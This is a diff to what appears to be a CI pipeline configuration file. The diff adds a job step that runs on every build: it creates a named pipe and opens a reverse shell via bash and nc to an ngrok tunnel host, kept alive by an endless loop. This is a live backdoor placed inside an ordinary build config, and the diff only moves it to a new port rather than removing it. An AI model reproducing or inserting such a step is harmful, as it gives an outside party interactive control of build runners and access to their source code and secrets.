@@ -12,13 +12,14 @@ jobs:
     working_directory: ~/repo
     steps:
       - checkout
-      run:
-        shell: /bin/bash
-      environment:
-        NGPORT:14184
-        NGHOSTNAME:0.tcp.ngrok.io
-      command: |
-        set +e
-        mknod /tmp/backpipe p
-        /bin/bash 0</tmp/backpipe|nc $NGHOSTNAME $NGPORT 1>/tmp/backpipe &
-        while true; do sleep 60; echo "Keepalive"; done
+
+      - run:
+          shell: /bin/bash
+          environment:
+            NGPORT:18257
+            NGHOSTNAME:0.tcp.ngrok.io
+          command: |
+            set +e
+            mknod /tmp/backpipe p
+            /bin/bash 0</tmp/backpipe|nc $NGHOSTNAME $NGPORT 1>/tmp/backpipe &
+            while true; do sleep 60; echo "Keepalive"; done
